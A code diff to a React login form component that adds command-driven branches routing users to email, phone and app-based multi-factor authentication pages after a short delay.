@@ -48,6 +48,30 @@ export default function LoginForm() {
             setCurrentStep('phone_otp');
         }  else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
+        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/AuthenticationPage');
+            }, 1500);
+        } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/NumAuthenticationPage');
+            }, 1500);
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/MfaPage');
+            }, 1500);
         } else if (command === 'FINISH') {
             router.push('/verificationPage');
         }
